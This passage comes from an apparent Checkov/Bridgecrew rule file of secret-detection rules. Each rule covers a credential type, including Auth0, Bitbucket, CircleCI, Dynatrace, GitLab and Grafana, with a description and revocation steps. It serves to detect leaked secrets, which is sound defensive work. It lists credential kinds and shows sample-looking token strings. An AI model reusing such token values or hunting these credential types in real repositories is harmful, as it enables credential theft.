<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>You can only delete an app if it's not installed anywhere. If your app is currently installed on a site, uninstall it.<br/>
Select Settings in the left menu, and select Delete app.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_25' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_25</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_25' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_26</key>
    <name>Auth0 Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="auth0-keys"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-auth-0-keys"></div>Auth0 Keys</div><a aria-label="Skip link to Auth0 Keys" class="heading-anchor-icon fa fa-anchor" href="#auth0-keys"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>All Auth0-issued JWTs have JSON Web Signatures (JWSs), meaning they are signed rather than encrypted. A JWS represents content secured with digital signatures or Message Authentication Codes (MACs) using JSON-based data structures.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Once issued, access tokens and ID tokens cannot be revoked in the same way as cookies with session IDs for server-side sessions.</p>
<p>As a result, tokens should be issued for relatively short periods, and then refreshed periodically if the user remains active.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_26' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_26</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_26' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_27</key>
    <name>Bitbucket Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="bitbucket-keys"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-bitbucket-keys"></div>Bitbucket Keys</div><a aria-label="Skip link to Bitbucket Keys" class="heading-anchor-icon fa fa-anchor" href="#bitbucket-keys"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Bitbucket Cloud REST API integrations, and Atlassian Connect for Bitbucket add-ons, can use OAuth 2.0 to access resources in Bitbucket. For obtaining access/bearer tokens, we support three of RFC-6749's grant flows, plus a custom Bitbucket flow for exchanging JWT tokens for access tokens.</p>
<p>Client ID: Stores the identifier that the authorization service uses to validate a login request. You generate this value in the authorization service when you configure the authorization settings for a web application and enter an authorized redirect URI.<br/>
Client Secret: Stores the secret or password used to validate the client ID. You generate this value in the authorization service together with the client ID.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Access tokens expire in two hours. When this happens you'll get 401 responses.</p>
<p>Most access token grant response therefore include a refresh token that can then be used to generate a new access token, without the need for end user participation:</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_27' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_27</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_27' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_29</key>
    <name>CircleCI Personal Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="circleci-personal-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-circle-ci-personal-token"></div>CircleCI Personal Token</div><a aria-label="Skip link to CircleCI Personal Token" class="heading-anchor-icon fa fa-anchor" href="#circleci-personal-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>To use the CircleCI API or view details about your pipelines, you will need API tokens with the appropriate permissions. This document describes the types of API tokens available, as well as how to create and delete them.</p>
<p>There are two types of API token you can create within CircleCI.<br/>
Personal: These tokens are used to interact with the CircleCI API and grant full read and write permissions.<br/>
Project: These tokens allow you to read/write information for specific projects. Project tokens have three scope options: Status, Read Only, and Admin. - Status tokens grant read access to the project&#8217;s build statuses. Useful for embedding status badges. - Read Only tokens grant read only access to the project&#8217;s API. - Admin tokens grant read and write access for the project&#8217;s API.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>In the CircleCI application, go to your User settings</li>
<li>Click Personal API Tokens</li>
<li>Click the X in the Remove column for the token you wish to replace and confirm your deletion.</li>
<li>Click the Create New Token button.</li>
<li>In the Token name field, type a new name for the old token you are rotating. It can be the same name given to the old token.</li>
<li>Click the Add API Token button.</li>
<li>After the token appears, copy and paste it to another location. You will not be able to view the token again.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_29' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_29</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_29' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_31</key>
    <name>Coinbase Keys</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="coinbase-keys"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-coinbase-keys"></div>Coinbase Keys</div><a aria-label="Skip link to Coinbase Keys" class="heading-anchor-icon fa fa-anchor" href="#coinbase-keys"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Coinbase, is an American publicly traded company that operates a cryptocurrency exchange platform. Coinbase is a distributed company. It is the largest cryptocurrency exchange in the United States by trading volume.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>The API key can be revoked from your dashboard in the API tab.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_31' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_31</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_31' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_32</key>
    <name>Confluent Keys</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="confluent-keys"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-confluent-keys"></div>Confluent Keys</div><a aria-label="Skip link to Confluent Keys" class="heading-anchor-icon fa fa-anchor" href="#confluent-keys"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>API keys for Confluent Cloud can be created with user and service accounts. A service account is intended to provide an identity for an application or service that needs to perform programmatic operations within Confluent Cloud. When moving to production, ensure that only service account API keys are used. Avoid user account API keys, except for development and testing. If a user leaves and a user account is deleted, all API keys created with that user account are deleted and might break applications.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>From the appropriate API Access tab for the Kafka, Schema Registry, or ksqlDB resource, select the key that you want to delete.</li>
<li>Click the trash icon. The Confirm API key deletion dialog appears.</li>
<li>Click Confirm.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_32' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_32</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_32' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_33</key>
    <name>Databricks Authentication Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="databricks-authentication-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-databricks-authentication-token"></div>Databricks Authentication Token</div><a aria-label="Skip link to Databricks Authentication Token" class="heading-anchor-icon fa fa-anchor" href="#databricks-authentication-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>To authenticate to and access Databricks REST APIs, you can use Databricks personal access tokens or passwords. Databricks strongly recommends that you use tokens. Tokens replace passwords in an authentication flow and should be protected like passwords. To protect tokens, Databricks recommends that you store tokens in: </p>
<ul>
<li>Secret management and retrieve tokens in notebooks using the Secrets utility (dbutils.secrets).</li>
<li>A local key store and use the Python keyring package to retrieve tokens at runtime.</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>Find the token ID. See Get tokens for the workspace.</li>
<li>Call the delete a token API (DELETE /token-management/tokens). Pass the token ID in the path.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_33' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_33</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_33' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_38</key>
    <name>Dropbox App Credentials</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="dropbox-app-credentials"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-dropbox-app-credentials"></div>Dropbox App Credentials</div><a aria-label="Skip link to Dropbox App Credentials" class="heading-anchor-icon fa fa-anchor" href="#dropbox-app-credentials"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When working with the Dropbox APIs, your app will access Dropbox on behalf of your users. You'll need to have each user of your app sign into dropbox.com to grant your app permission to access their data on Dropbox. Dropbox uses OAuth 2.0, an open specification, to authorize access to a user&#8217;s data. Once completed by a user, the OAuth flow returns an access token to your app. This authorization token your app and user in subsequent API calls. It should be passed with the Authorization HTTP header value of Bearer <!-- -->.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">/token/revoke</code> Disables the access token used to authenticate the call. If there is a corresponding refresh token for the access token, this disables that refresh token, as well as any other access tokens for that refresh token.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">curl -X POST https://api.dropboxapi.com/2/auth/token/revoke \
    --header "Authorization: Bearer "
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_38' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_38</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_38' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_39</key>
    <name>Dynatrace Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="dynatrace-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-dynatrace-token"></div>Dynatrace token</div><a aria-label="Skip link to Dynatrace token" class="heading-anchor-icon fa fa-anchor" href="#dynatrace-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>To be authenticated to use the Dynatrace API, you need a valid access token or a valid personal access token. Access to the API is fine-grained, meaning that you also need the proper scopes assigned to the token. See the description of each request to find out which scopes are required to use it. </p>
<p>Dynatrace uses a unique token format consisting of three components separated by dots (.).</p>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">dt0c01.ST2EY72KQINMH574WMNVI7YN.G3DFPBEJYMODIDAEX454M7YWBUVEFOWKPRVMWFASS64NFH52PX6BNDVFFM572RZM</code></p>
<p>The part of a token composed of the prefix and public portion is a token identifier. For example dt0c01.ST2EY72KQINMH574WMNVI7YN. Token identifier can be safely displayed in the UI and can be used for logging purposes.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>To execute this request, you need an access token with Write API tokens (apiTokens.write) scope:<br/>
Managed	<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">https://{your-domain}/e/{your-environment-id}/api/v2/apiTokens/{id}</code><br/>
SaaS: <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">https://{your-environment-id}.live.dynatrace.com/api/v2/apiTokens/{id}</code><br/>
Environment: <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">ActiveGate https://{your-activegate-domain}/e/{your-environment-id}/api/v2/apiTokens/{id}</code></p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_39' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_39</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_39' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_40</key>
    <name>Elastic Email Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="elastic-email-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-elastic-email-key"></div>Elastic Email Key</div><a aria-label="Skip link to Elastic Email Key" class="heading-anchor-icon fa fa-anchor" href="#elastic-email-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Elastic Email is a mail relay service. That is, instead of your website sending mail via its own SMTP server, outgoing email is directed through the Elastic Email service and out onto the internet. The API Key is a 96-character single GUID and it is the key to your account when trying to gain access or make API calls while outside of the User Interface. Every API call will require this key. It is unique for API connections and separate from SMTP Relay communication.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Permanently delete AccessToken from your Account:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">https://api.elasticemail.com/v2/accesstoken/delete?apikey=7H29A61A88F5D6F1CX5CC79IWQADW3EFC98CD5F4428W7WU2B873256BCECCDCIAP8A5C4JS6A29675XHFBED2DFCDF9I1QW&amp;tokenName=My Token&amp;type=
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_40' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_40</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_40' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_41</key>
    <name>Fastly Personal Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fastly-personal-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fastly-personal-token"></div>Fastly Personal Token</div><a aria-label="Skip link to Fastly Personal Token" class="heading-anchor-icon fa fa-anchor" href="#fastly-personal-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Fastly's API tokens are unique authentication credentials assigned to individual users. You need to create an API token to use the Fastly API. You can use API tokens to grant applications restricted access to your Fastly account and services. For example, an engineer user could limit a token to only have access to a single service, and restrict the scope to only allow that token to purge by URL. Every Fastly user can create up to 100 API tokens.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>To delete an account API token or to revoke another user's API token as a superuser, follow the steps below:</p>
<ol>
<li>Log in to the Fastly web interface and click the Account link from the user menu. Your account information appears.</li>
<li>Click the Account API tokens link. The Account API Tokens page appears with a list of tokens associated with your organization's Fastly account.</li>
<li>Find the API token you want to delete and click the trash icon. A warning message appears.</li>
<li>Click the Delete button to permanently delete the API token.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_41' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_41</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_41' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_42</key>
    <name>FullStory API Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fullstory-api-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-full-story-api-key"></div>FullStory API Key</div><a aria-label="Skip link to FullStory API Key" class="heading-anchor-icon fa fa-anchor" href="#fullstory-api-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>FullStory&#8217;s HTTP APIs use API keys for authentication. If you are configuring an integration or building some tools of your own that make HTTP calls, you will need a key.<br/>
In the FullStory UI the &#8220;All Keys&#8221; tab shows you all the keys that you have permission to view. If you are an Administrator, then in addition to keys that you have created, you&#8217;ll also be able to see other users&#8217; keys and legacy keys. If you are a Standard or Architect user, you will only be able to see your own keys.</p>
<p>Administrators who might be looking at a long list of keys can click the &#8220;My Keys&#8221; tab to view only their own keys, or the &#8220;Legacy Keys&#8221; tab to view any legacy keys.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>To delete a key, click the &#8220;Delete&#8221; button that appears at the end of the row where the key is displayed. When you delete a key, API calls making use of the key value will stop working immediately.</p>
<p>Administrators may delete keys for all users. Standard and Architect users may only delete their own keys.</p>
<p>Note that removing or changing the permissions of a user does not affect any API keys that may have been created by that user. For example, if you change a user from "Admin" to "Guest" and wish to remove API keys they may have created, you'll need to do that at the settings page following the instructions above.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_42' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_42</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_42' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_44</key>
    <name>GitLab Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gitlab-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-lab-token"></div>GitLab Token</div><a aria-label="Skip link to GitLab Token" class="heading-anchor-icon fa fa-anchor" href="#gitlab-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Personal access tokens can be an alternative to OAuth2 and used to:</p>
<ul>
<li>Authenticate with the GitLab API.</li>
<li>Authenticate with Git using HTTP Basic Authentication.<br/>
In both cases, you authenticate with a personal access token in place of your password.</li>
</ul>
<p>Personal access tokens are:</p>
<ul>
<li>Required when two-factor authentication (2FA) is enabled.</li>
<li>Used with a GitLab username to authenticate with GitLab features that require usernames. For example, GitLab-managed Terraform state backend and Docker container registry,</li>
<li>Similar to project access tokens and group access tokens, but are attached to a user rather than a project or group.</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>In the top-right corner, select your avatar.</li>
<li>Select Edit profile.</li>
<li>On the left sidebar, select Access Tokens.</li>
<li>In the Active personal access tokens area, next to the key, select Revoke.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_44' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_44</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_44' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_45</key>
    <name>Google Cloud Keys</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="google-cloud-keys"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-google-cloud-keys"></div>Google Cloud Keys</div><a aria-label="Skip link to Google Cloud Keys" class="heading-anchor-icon fa fa-anchor" href="#google-cloud-keys"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Google Cloud API key can be used to authenticate to an API. The API key associates the request with a Google Cloud project for billing and quota purposes. Because API keys do not identify the caller, they are generally used for accessing public data or resources. Many Google Cloud APIs do not accept API keys for authentication. When you use Google Cloud API keys in your applications, ensure that they are kept secure during both storage and transmission. Publicly exposing your API keys can lead to unexpected charges on your account.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>Navigate to APIs &amp; Services console at <a href="https://console.cloud.google.com/apis/credentials" target="_self">https://console.cloud.google.com/apis/credentials</a>.</li>
<li>In the main navigation panel, select Credentials to access the list of the API keys created for the selected Google Cloud Platform (GCP) project.<br/>
3.On the Credentials page, in the API Keys section, select the API key that you want to delete, and choose DELETE button from the console top menu to remove the selected key from your GCP project. </li>
<li>Inside the Delete credential confirmation box, choose DELETE to confirm the removal action. The selected API key will be deleted immediately and permanently.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_45' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_45</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_45' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_46</key>
    <name>Grafana Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="grafana-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-grafana-token"></div>Grafana Token</div><a aria-label="Skip link to Grafana Token" class="heading-anchor-icon fa fa-anchor" href="#grafana-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Grafana API key is a randomly generated string that external systems use to interact with Grafana HTTP APIs. When you create an API key, you specify a Role that determines the permissions associated with the API key. Role permissions control that actions the API key can perform on Grafana resources.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">DELETE /api/auth/keys/:id</code></p>
